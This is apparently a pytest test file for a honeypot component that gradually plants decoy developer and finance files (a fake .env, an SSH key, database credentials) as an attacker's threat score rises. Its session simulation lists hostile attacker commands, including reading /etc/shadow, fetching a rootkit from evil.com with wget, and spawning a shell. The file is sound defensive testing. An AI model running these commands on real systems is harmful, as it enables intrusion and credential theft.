"""Tests for PersonaSwitcher -- Sprint 5.

Covers:
    - TransitionState and ChangeEvent models
    - initiate_switch starts transition correctly
    - apply_next_changes drains queue over exactly 5 calls
    - Each call applies 1-2 changes (never a full dump)
    - Phase progression: seeding -> building -> completing -> done
    - Changes appear in overlay (directories, files)
    - No double-switching: second switch queued during transition
    - Queued switch starts automatically after current finishes
    - Both transition paths: generic->dev and *->finance
    - Full 25-command session simulation with two transitions
"""
from __future__ import annotations

import pytest

from honeypot.persona_switcher import (
    ChangeEvent,
    PersonaSwitcher,
    TransitionPhase,
    TransitionState,
    _build_generic_to_dev,
    _build_to_finance,
)
from honeypot.session_overlay import SessionOverlay


# ===================================================================
# Model tests
# ===================================================================

class TestModels:

    def test_change_event_fields(self):
        e = ChangeEvent(
            change_type="add_file",
            path="/tmp/test",
            description="test file",
            content="hello",
            phase=TransitionPhase.SEEDING,
        )
        assert e.change_type == "add_file"
        assert e.content == "hello"

    def test_transition_state_defaults(self):
        s = TransitionState(
            session_id="s1",
            from_persona="generic_linux",
            to_persona="dev_workstation",
            reason="score threshold",
        )
        assert s.phase == TransitionPhase.IDLE
        assert s.steps_completed == 0
        assert s.change_queue == []
        assert s.changes_applied == []

    def test_transition_phase_values(self):
        assert TransitionPhase.IDLE == "idle"
        assert TransitionPhase.SEEDING == "seeding"
        assert TransitionPhase.BUILDING == "building"
        assert TransitionPhase.COMPLETING == "completing"
        assert TransitionPhase.DONE == "done"


# ===================================================================
# Change queue builder tests
# ===================================================================

class TestChangeQueueBuilders:

    def test_generic_to_dev_has_changes(self):
        events = _build_generic_to_dev()
        assert len(events) >= 6

    def test_generic_to_dev_ordering(self):
        events = _build_generic_to_dev()
        phases = [e.phase for e in events]
        phase_order = {TransitionPhase.SEEDING: 0, TransitionPhase.BUILDING: 1, TransitionPhase.COMPLETING: 2}
        for i in range(len(phases) - 1):
            assert phase_order[phases[i]] <= phase_order[phases[i + 1]], (
                f"Phase went backward: {phases[i]} -> {phases[i+1]} at index {i}"
            )

    def test_generic_to_dev_has_home_dir(self):
        events = _build_generic_to_dev()
        paths = [e.path for e in events]
        assert "/home/john.dev" in paths

    def test_generic_to_dev_has_env_file(self):
        events = _build_generic_to_dev()
        paths = [e.path for e in events]
        assert "/home/john.dev/projects/webapp/.env" in paths

    def test_generic_to_dev_has_ssh_key(self):
        events = _build_generic_to_dev()
        paths = [e.path for e in events]
        assert "/home/john.dev/.ssh/id_rsa" in paths

    def test_generic_to_dev_env_has_content(self):
        events = _build_generic_to_dev()
        env_event = next(e for e in events if ".env" in e.path)
        assert env_event.content is not None
        assert "DB_" in env_event.content or "PASSWORD" in env_event.content.upper()

    def test_to_finance_has_changes(self):
        events = _build_to_finance()
        assert len(events) >= 6

    def test_to_finance_ordering(self):
        events = _build_to_finance()
        phases = [e.phase for e in events]
        phase_order = {TransitionPhase.SEEDING: 0, TransitionPhase.BUILDING: 1, TransitionPhase.COMPLETING: 2}
        for i in range(len(phases) - 1):
            assert phase_order[phases[i]] <= phase_order[phases[i + 1]]

    def test_to_finance_has_finapp_home(self):
        events = _build_to_finance()
        paths = [e.path for e in events]
        assert "/home/finapp" in paths

    def test_to_finance_has_database_yml(self):
        events = _build_to_finance()
        paths = [e.path for e in events]
        assert "/home/finapp/config/database.yml" in paths

    def test_to_finance_has_transactions(self):
        events = _build_to_finance()
        paths = [e.path for e in events]
        assert any("transactions" in p for p in paths)

    def test_to_finance_has_audit_log(self):
        events = _build_to_finance()
        paths = [e.path for e in events]
        assert "/home/finapp/logs/audit.log" in paths

    def test_to_finance_db_yml_has_credentials(self):
        events = _build_to_finance()
        db_event = next(e for e in events if "database.yml" in e.path)
        assert db_event.content is not None
        assert len(db_event.content) > 10


# ===================================================================
# PersonaSwitcher lifecycle
# ===================================================================

class TestInitiateSwitch:

    def test_starts_immediately_when_idle(self):
        sw = PersonaSwitcher()
        started = sw.initiate_switch("s1", "generic_linux", "dev_workstation", "score >= 51")
        assert started is True
        assert sw.is_transitioning() is True

    def test_state_populated(self):
        sw = PersonaSwitcher()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "threshold")
        assert sw.state is not None
        assert sw.state.from_persona == "generic_linux"
        assert sw.state.to_persona == "dev_workstation"
        assert sw.state.phase == TransitionPhase.SEEDING
        assert len(sw.state.change_queue) > 0

    def test_not_transitioning_before_initiate(self):
        sw = PersonaSwitcher()
        assert sw.is_transitioning() is False

    def test_not_transitioning_after_done(self):
        sw = PersonaSwitcher(transition_steps=1)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")
        sw.apply_next_changes(overlay)
        assert sw.is_transitioning() is False


class TestApplyNextChanges:

    def test_drains_over_five_calls(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        all_applied: list[ChangeEvent] = []
        for step in range(5):
            batch = sw.apply_next_changes(overlay)
            assert len(batch) >= 1, f"Step {step+1} returned empty batch"
            all_applied.extend(batch)

        assert not sw.is_transitioning()
        assert sw.state.phase == TransitionPhase.DONE
        total_changes = len(_build_generic_to_dev())
        assert len(all_applied) == total_changes

    def test_max_two_per_call(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for step in range(5):
            batch = sw.apply_next_changes(overlay)
            if sw.is_transitioning():
                assert len(batch) <= 2, f"Step {step+1} applied {len(batch)} changes (max 2)"

    def test_last_step_drains_remainder(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        total = 0
        for _ in range(5):
            batch = sw.apply_next_changes(overlay)
            total += len(batch)

        assert total == len(_build_generic_to_dev())

    def test_extra_calls_after_done_return_empty(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert sw.apply_next_changes(overlay) == []
        assert sw.apply_next_changes(overlay) == []

    def test_no_calls_without_initiate(self):
        sw = PersonaSwitcher()
        overlay = SessionOverlay()
        assert sw.apply_next_changes(overlay) == []


class TestPhaseProgression:

    def test_starts_in_seeding(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")
        assert sw.state.phase == TransitionPhase.SEEDING

    def test_phases_advance(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        phases_seen: list[str] = []
        for _ in range(5):
            sw.apply_next_changes(overlay)
            phases_seen.append(sw.state.phase.value)

        assert "seeding" in phases_seen
        assert "done" in phases_seen

    def test_ends_in_done(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert sw.state.phase == TransitionPhase.DONE


class TestOverlayChanges:

    def test_directories_created_in_overlay(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert "/home/john.dev" in overlay.entries

    def test_files_created_with_content(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert "/home/john.dev/projects/webapp/.env" in overlay.entries
        env_entry = overlay.entries["/home/john.dev/projects/webapp/.env"]
        assert len(env_entry.content) > 0

    def test_ssh_key_created(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert "/home/john.dev/.ssh/id_rsa" in overlay.entries
        key_content = overlay.entries["/home/john.dev/.ssh/id_rsa"].content
        assert "PRIVATE KEY" in key_content

    def test_finance_files_created(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "finance_server", "critical")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        assert "/home/finapp" in overlay.entries
        assert "/home/finapp/config/database.yml" in overlay.entries
        db_content = overlay.entries["/home/finapp/config/database.yml"].content
        assert len(db_content) > 0

    def test_finance_transactions_csv(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "finance_server", "critical")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        csv_path = "/home/finapp/reports/q1-2026-transactions.csv"
        assert csv_path in overlay.entries
        assert len(overlay.entries[csv_path].content) > 0


# ===================================================================
# Double-switching / queuing
# ===================================================================

class TestDoubleSwitch:

    def test_second_switch_queued(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "score 51")

        queued = sw.initiate_switch("s1", "dev_workstation", "finance_server", "score 81")
        assert queued is False
        assert sw.has_queued() is True
        assert sw.state.to_persona == "dev_workstation"

    def test_queued_switch_starts_after_current_finishes(self):
        sw = PersonaSwitcher(transition_steps=3)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "score 51")
        sw.initiate_switch("s1", "dev_workstation", "finance_server", "score 81")

        for _ in range(3):
            sw.apply_next_changes(overlay)

        assert sw.is_transitioning() is True
        assert sw.state.to_persona == "finance_server"
        assert sw.has_queued() is False

    def test_both_transitions_complete(self):
        sw = PersonaSwitcher(transition_steps=3)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "score 51")
        sw.initiate_switch("s1", "dev_workstation", "finance_server", "score 81")

        for _ in range(3):
            sw.apply_next_changes(overlay)

        for _ in range(3):
            sw.apply_next_changes(overlay)

        assert sw.state.phase == TransitionPhase.DONE
        assert sw.state.to_persona == "finance_server"
        assert "/home/john.dev" in overlay.entries
        assert "/home/finapp" in overlay.entries

    def test_no_triple_queue(self):
        """Only one queued switch at a time; latest wins."""
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "first")
        sw.initiate_switch("s1", "dev_workstation", "finance_server", "second")
        sw.initiate_switch("s1", "dev_workstation", "finance_server", "third override")

        assert sw.has_queued() is True


# ===================================================================
# Gradual drift verification (the core innovation test)
# ===================================================================

class TestGradualDrift:
    """Verify changes appear gradually, not all at once."""

    def test_not_all_changes_on_first_call(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        first_batch = sw.apply_next_changes(overlay)
        total_changes = len(_build_generic_to_dev())
        assert len(first_batch) < total_changes, (
            f"First call applied {len(first_batch)}/{total_changes} changes -- not gradual"
        )

    def test_seeding_changes_come_first(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        first_batch = sw.apply_next_changes(overlay)
        for event in first_batch:
            assert event.phase == TransitionPhase.SEEDING, (
                f"First batch had non-seeding event: {event.description}"
            )

    def test_completing_changes_come_last(self):
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        all_batches: list[list[ChangeEvent]] = []
        for _ in range(5):
            batch = sw.apply_next_changes(overlay)
            if batch:
                all_batches.append(batch)

        last_batch = all_batches[-1]
        assert any(e.phase == TransitionPhase.COMPLETING for e in last_batch)

    def test_ssh_key_not_in_first_two_batches(self):
        """The high-value SSH key should appear late, not early."""
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        early_paths: list[str] = []
        for _ in range(2):
            batch = sw.apply_next_changes(overlay)
            early_paths.extend(e.path for e in batch)

        assert "/home/john.dev/.ssh/id_rsa" not in early_paths, (
            "SSH key appeared too early -- should be in completing phase"
        )

    def test_home_dir_in_first_batch(self):
        """The new home directory should be one of the first hints."""
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        first_batch = sw.apply_next_changes(overlay)
        first_paths = [e.path for e in first_batch]
        assert "/home/john.dev" in first_paths


# ===================================================================
# Full 25-command session simulation
# ===================================================================

class TestFullSessionSimulation:
    """Simulate a 25-command attack that crosses both thresholds."""

    def test_full_session_two_transitions(self):
        from honeypot.cowrie_hook import create_dispatcher

        disp = create_dispatcher(
            persona_name="generic_linux",
            login_user="root",
        )

        sw = PersonaSwitcher(transition_steps=5)
        overlay = disp.session.overlay

        commands = [
            # Phase 1: LOW -- basic recon (cmds 1-7)
            "ls", "pwd", "whoami", "id", "uname -a", "hostname", "df -h",
            # Phase 2: MEDIUM -- exploration (cmds 8-12)
            "cat /etc/passwd", "ps aux", "netstat -tulpn",
            "cat /var/log/auth.log", "find / -writable",
            # Trigger 1: score crosses 51 -> dev_workstation
            "sudo -l", "cat /etc/shadow",
            # Transition drift commands (cmds 15-19)
            "ls /home", "ps aux", "cat /etc/hostname", "find / -name .env", "ls -la /home",
            # Phase 3: HIGH -> CRITICAL (cmds 20-22)
            "wget http://evil.com/rootkit.sh", "chmod +x rootkit.sh", "bash -i",
            # Trigger 2: score crosses 81 -> finance_server
            # More drift commands (cmds 23-25)
            "ls /home", "ps aux", "cat /etc/hostname",
        ]
        assert len(commands) == 25

        transition_1_started = False
        transition_2_started = False
        transition_1_done = False

        for i, cmd in enumerate(commands):
            resp, source = disp.dispatch(cmd)

            if disp._threat_score >= 51 and not transition_1_started:
                sw.initiate_switch("s1", "generic_linux", "dev_workstation", "score >= 51")
                transition_1_started = True

            if disp._threat_score >= 81 and not transition_2_started:
                sw.initiate_switch("s1", "dev_workstation", "finance_server", "score >= 81")
                transition_2_started = True

            if sw.is_transitioning():
                changes = sw.apply_next_changes(overlay)

            if transition_1_started and sw.state and sw.state.to_persona == "dev_workstation" and sw.state.phase == TransitionPhase.DONE:
                transition_1_done = True

        assert transition_1_started, "First transition never triggered"
        assert transition_2_started or disp._threat_score < 81, "Expected second transition or score < 81"
        assert disp._threat_score > 0, "Threat score should have increased"
        assert len(disp.session.command_history) == 25, "All 25 commands should be in history"

        assert "/home/john.dev" in overlay.entries, (
            "Dev persona home should exist after transition"
        )

    def test_session_history_preserved_across_switch(self):
        """History command should still show all prior commands."""
        from honeypot.cowrie_hook import create_dispatcher

        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        sw = PersonaSwitcher(transition_steps=3)

        pre_switch = ["whoami", "id", "cat /etc/passwd", "ps aux", "netstat -tulpn"]
        for cmd in pre_switch:
            disp.dispatch(cmd)

        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")
        for _ in range(3):
            sw.apply_next_changes(disp.session.overlay)

        disp.dispatch("ls")

        assert len(disp.session.command_history) == 6
        assert disp.session.command_history[0]["raw"] == "whoami"
        assert disp.session.command_history[4]["raw"] == "netstat -tulpn"

    def test_cwd_unchanged_by_switch(self):
        from honeypot.cowrie_hook import create_dispatcher

        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        disp.dispatch("cd /tmp")
        cwd_before = disp.session.current_directory

        sw = PersonaSwitcher(transition_steps=3)
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")
        for _ in range(3):
            sw.apply_next_changes(disp.session.overlay)

        assert disp.session.current_directory == cwd_before

    def test_new_persona_content_reachable_via_overlay(self):
        """After dev transition, cat .env should return content via overlay."""
        sw = PersonaSwitcher(transition_steps=5)
        overlay = SessionOverlay()
        sw.initiate_switch("s1", "generic_linux", "dev_workstation", "test")

        for _ in range(5):
            sw.apply_next_changes(overlay)

        from honeypot.fakefs import FakeFS
        fs = FakeFS("generic_linux")

        env_content = overlay.get_content("/home/john.dev/projects/webapp/.env", fs)
        assert env_content is not None
        assert "DB_" in env_content or "PASSWORD" in env_content.upper()

        key_content = overlay.get_content("/home/john.dev/.ssh/id_rsa", fs)
        assert key_content is not None
        assert "PRIVATE KEY" in key_content
